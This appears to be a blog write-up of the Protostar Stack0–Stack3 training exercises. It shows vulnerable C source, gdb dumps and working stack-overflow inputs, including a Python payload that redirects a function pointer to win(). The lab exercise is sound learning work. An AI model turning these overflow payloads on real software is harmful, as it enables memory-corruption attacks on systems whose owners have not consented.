---
layout: post
title:  "Protostar Stack0, Stack1, Stack2 & Stack3"
date:   2023-04-5 09:00:00 +1100
categories: Journey
tags: 
---
## Stack 0
This is a simple c program that contains the highly exploitable gets function that allows buffer overflows as it does not validate for input length.

Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

We can see this main function disassembled through gdb:
```bash
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
```

We set two breakpoints, at and after the gets call `call   0x804830c <gets@plt>`:
```bash
(gdb) break *0x0804840c
Breakpoint 1 at 0x804840c: file stack0/stack0.c, line 11.
(gdb) break *0x08048411
Breakpoint 2 at 0x8048411: file stack0/stack0.c, line 13.
```

With a handy command I learnt through liveoverflow, we set a hook-stop
```bash
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/24wx $esp
>x/2i $esp
>end
```

Now we can see what information is in the registers, in the stack, and the next to lines of assembly that will be run.

My first run showed me how much my characters were filling up the stack:
```bash
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack0
eax            0xbffff77c       -1073744004
ecx            0xf15673fd       -245992451
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7c8       0xbffff7c8
esi            0x0      0
edi            0x0      0
eip            0x804840c        0x804840c <main+24>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0xb7eada75
0xbffff780:     0xb7fd7ff4      0x08049620      0xbffff798      0x080482e8
0xbffff790:     0xb7ff1040      0x08049620      0xbffff7c8      0x08048469
0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7c8
0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
0x804840c <main+24>:    call   0x804830c <gets@plt>
0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]

Breakpoint 1, 0x0804840c in main (argc=1, argv=0xbffff874) at stack0/stack0.c:11
11      in stack0/stack0.c
(gdb) disass main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
(gdb) c
Continuing.
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP
eax            0xbffff77c       -1073744004
ecx            0xbffff77c       -1073744004
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7c8       0xbffff7c8
esi            0x0      0
edi            0x0      0
eip            0x8048411        0x8048411 <main+29>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0x41414141
0xbffff780:     0x42424242      0x43434343      0x44444444      0x45454545
0xbffff790:     0x46464646      0x47474747      0x48484848      0x49494949
0xbffff7a0:     0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d
0xbffff7b0:     0x4e4e4e4e      0x4f4f4f4f      0x50505050      0x00000000
0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:    test   eax,eax

Breakpoint 2, main (argc=1, argv=0xbffff874) at stack0/stack0.c:13
13      in stack0/stack0.c
(gdb) C
Continuing.
Try again?

Program exited with code 013.
Error while running hook_stop:
The program has no registers now.
```

Looking at the stacks last line/top of the stack, 0x00000000 still has not changed, so when we perform `text eax,eax`/`modified != 0`, as the stack has not changed, it does not let us pass.

Running this again, except with 4 more characters to fill up the last segment of the stack we get the expected output:

```bash
(gdb) r
Starting program: /opt/protostar/bin/stack0
eax            0xbffff77c       -1073744004
ecx            0x1e70f126       510718246
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7c8       0xbffff7c8
esi            0x0      0
edi            0x0      0
eip            0x804840c        0x804840c <main+24>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0xb7eada75
0xbffff780:     0xb7fd7ff4      0x08049620      0xbffff798      0x080482e8
0xbffff790:     0xb7ff1040      0x08049620      0xbffff7c8      0x08048469
0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7c8
0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
0x804840c <main+24>:    call   0x804830c <gets@plt>
0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]

Breakpoint 1, 0x0804840c in main (argc=1, argv=0xbffff874) at stack0/stack0.c:11
11      in stack0/stack0.c
(gdb) c
Continuing.
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ
eax            0xbffff77c       -1073744004
ecx            0xbffff77c       -1073744004
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7c8       0xbffff7c8
esi            0x0      0
edi            0x0      0
eip            0x8048411        0x8048411 <main+29>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0x41414141
0xbffff780:     0x42424242      0x43434343      0x44444444      0x45454545
0xbffff790:     0x46464646      0x47474747      0x48484848      0x49494949
0xbffff7a0:     0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d
0xbffff7b0:     0x4e4e4e4e      0x4f4f4f4f      0x50505050      0x51515151
0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:    test   eax,eax

Breakpoint 2, main (argc=1, argv=0xbffff874) at stack0/stack0.c:13
13      in stack0/stack0.c
(gdb) c
Continuing.
you have changed the 'modified' variable

Program exited with code 051.
Error while running hook_stop:
The program has no registers now.
```

We can clean up this solution with below:

```python
print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ"
```

Running like below sends the output of the python script straight to STDIN of the stack0 program, providing us with desired output.
```bash
user@protostar:/tmp$ python pattern.py | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```

## Stack 1
However ineloquent, I simply brute forced this one.

Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

I simple need to find a way to force an area in the stack, where currently exist `0x00000000` (default output) to equal `0x61626364`. As the stack runs bottom up, we need to insert the values `0x64636261` what are `dcba` in ascii. 

```python
>>> chr(0x64)
'd'
>>> chr(0x63)
'c'
>>> chr(0x62)
'b'
>>> chr(0x61)
'a'
```

I added breakpoints to the `call   0x8048368 <strcpy@plt>` and `mov    eax,DWORD PTR [esp+0x5c]` lines, so that I can see the stack pre input, post input and pre comparison.

When run with `set args dcba` we can see a few things:
```bash
0xbffff760:     0xbffff77c      0xbffff9a4      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0x61626364
0xbffff780:     0xb7fd7f00      0x080496fc      0xbffff798      0x08048334
0xbffff790:     0xb7ff1040      0x080496fc      0xbffff7c8      0x08048509
0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x080484f0      0xbffff7c8
0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x080484fb      0x00000000
0xbffff7c0:     0x080484f0      0x00000000      0xbffff848      0xb7eadc76
0xbffff7d0:     0x00000002      0xbffff874      0xbffff880      0xb7fe1848
0xbffff7e0:     0xbffff830      0xffffffff      0xb7ffeff4      0x08048281
0xbffff7f0:     0x00000001      0xbffff830      0xb7ff0626      0xb7fffab0
0xbffff800:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff810:     0xbffff848      0x23a0868e      0x09f7509e      0x00000000
```

In the second line we see `0x61626364` and we see two lines with `0x00000000` within them, i assume to be the targets to buffer overflow into. I overflowed the stack right up to the first `0x00000000` on line `0xbffff7b0` and voila, we have the desired output!
```bash
(gdb) set args dcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcba
(gdb) r
Starting program: /opt/protostar/bin/stack1 dcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcba
eax            0xbffff73c       -1073744068
ecx            0xe3ef9174       -470838924
edx            0x2      2
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff720       0xbffff720
ebp            0xbffff788       0xbffff788
esi            0x0      0
edi            0x0      0
eip            0x80484a2        0x80484a2 <main+62>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff720:     0xbffff73c      0xbffff964      0xb7fff8f8      0xb7f0186e
0xbffff730:     0xb7fd7ff4      0xb7ec6165      0xbffff748      0xb7eada75
0xbffff740:     0xb7fd7ff4      0x080496fc      0xbffff758      0x08048334
0xbffff750:     0xb7ff1040      0x080496fc      0xbffff788      0x08048509
0xbffff760:     0xb7fd8304      0xb7fd7ff4      0x080484f0      0xbffff788
0xbffff770:     0xb7ec6365      0xb7ff1040      0x080484fb      0x00000000
0xbffff780:     0x080484f0      0x00000000      0xbffff808      0xb7eadc76
0xbffff790:     0x00000002      0xbffff834      0xbffff840      0xb7fe1848
0xbffff7a0:     0xbffff7f0      0xffffffff      0xb7ffeff4      0x08048281
0xbffff7b0:     0x00000001      0xbffff7f0      0xb7ff0626      0xb7fffab0
0xbffff7c0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff7d0:     0xbffff808      0xc9b8c764      0xe3ef9174      0x00000000
0x80484a2 <main+62>:    call   0x8048368 <strcpy@plt>
0x80484a7 <main+67>:    mov    eax,DWORD PTR [esp+0x5c]

Breakpoint 1, 0x080484a2 in main (argc=2, argv=0xbffff834) at stack1/stack1.c:16
16      in stack1/stack1.c
(gdb) c
Continuing.
eax            0xbffff73c       -1073744068
ecx            0x0      0
edx            0x45     69
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff720       0xbffff720
ebp            0xbffff788       0xbffff788
esi            0x0      0
edi            0x0      0
eip            0x80484a7        0x80484a7 <main+67>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff720:     0xbffff73c      0xbffff964      0xb7fff8f8      0xb7f0186e
0xbffff730:     0xb7fd7ff4      0xb7ec6165      0xbffff748      0x61626364
0xbffff740:     0x61626364      0x61626364      0x61626364      0x61626364
0xbffff750:     0x61626364      0x61626364      0x61626364      0x61626364
0xbffff760:     0x61626364      0x61626364      0x61626364      0x61626364
0xbffff770:     0x61626364      0x61626364      0x61626364      0x61626364
0xbffff780:     0x08048400      0x00000000      0xbffff808      0xb7eadc76
0xbffff790:     0x00000002      0xbffff834      0xbffff840      0xb7fe1848
0xbffff7a0:     0xbffff7f0      0xffffffff      0xb7ffeff4      0x08048281
0xbffff7b0:     0x00000001      0xbffff7f0      0xb7ff0626      0xb7fffab0
0xbffff7c0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff7d0:     0xbffff808      0xc9b8c764      0xe3ef9174      0x00000000
0x80484a7 <main+67>:    mov    eax,DWORD PTR [esp+0x5c]
0x80484ab <main+71>:    cmp    eax,0x61626364

Breakpoint 2, main (argc=2, argv=0xbffff834) at stack1/stack1.c:18
18      in stack1/stack1.c
(gdb) c
Continuing.
you have correctly got the variable to the right value
```

We can also simplify this into a single line with below:
```bash
user@protostar:/tmp$ /opt/protostar/bin/stack1 dcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcba
you have correctly got the variable to the right value
```

You can see this in action if you run this without 1 or 2 values:
```bash
user@protostar:/tmp$ /opt/protostar/bin/stack1 dcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadcbadc
Try again, you got 0x00006364
```

## Stack 2

Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

We find that the `GREENIE` env variable is not set, which is required for line `variable = getenv("GREENIE");`
```bash
user@protostar:~$ /opt/protostar/bin/stack2
stack2: please set the GREENIE environment variable
```

Testing this, we now find that it runs, but we are not satisfying the condition for `if(modified == 0x0d0a0d0a)`
```bash
user@protostar:~$ env | grep GREENIE
user@protostar:~$ export GREENIE=test
user@protostar:~$ /opt/protostar/bin/stack2
Try again, you got 0x00000000
user@protostar:~$ python
Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40)
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> chr(0x0a)
'\n'
>>> chr(0x0d)
'\r'
```

We pack the env variable to overflow the stack, 16 times to reach the target + 1 for the target address.
Using python to print out the target match condition `0x0d0a0d0a` or `\r\n\r\n`
```bash
user@protostar:/tmp$ export GREENIE=$(python -c "print '\x0a\x0d\x0a\x0d'*17")
user@protostar:/tmp$ /opt/protostar/bin/stack2
you have correctly modified the variable
```


## Stack 3

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

Disassembly for win and main functions:
```bash
(gdb) disass win
Dump of assembler code for function win:
0x08048424 <win+0>:     push   %ebp
0x08048425 <win+1>:     mov    %esp,%ebp
0x08048427 <win+3>:     sub    $0x18,%esp
0x0804842a <win+6>:     movl   $0x8048540,(%esp)
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave
0x08048437 <win+19>:    ret
End of assembler dump.
(gdb) disass main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   %ebp
0x08048439 <main+1>:    mov    %esp,%ebp
0x0804843b <main+3>:    and    $0xfffffff0,%esp
0x0804843e <main+6>:    sub    $0x60,%esp
0x08048441 <main+9>:    movl   $0x0,0x5c(%esp)
0x08048449 <main+17>:   lea    0x1c(%esp),%eax
0x0804844d <main+21>:   mov    %eax,(%esp)
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmpl   $0x0,0x5c(%esp)
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    $0x8048560,%eax
0x08048461 <main+41>:   mov    0x5c(%esp),%edx
0x08048465 <main+45>:   mov    %edx,0x4(%esp)
0x08048469 <main+49>:   mov    %eax,(%esp)
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    0x5c(%esp),%eax
0x08048475 <main+61>:   call   *%eax
0x08048477 <main+63>:   leave
0x08048478 <main+64>:   ret
End of assembler dump.
```

Here we need exploit the quirky way that fp is defined in the code, whereas it can be executed as a function. We need to have the `fp()` call point to the `win()` function `0x08048424`.

Python script to create exploit string:
```python
# 64 char buffer
buffer = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
# win() start address 
block = "\x24\x84\x04\x08" 
print buffer + block
```

Test and output this string to file: 
```bash
user@protostar:/tmp$ python stack3.py
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP$�
user@protostar:/tmp$ python stack3.py > stack3
```

Pipe this into stack3 and we have lift off!
```bash
user@protostar:/tmp$ cat stack3 | /opt/protostar/bin/stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
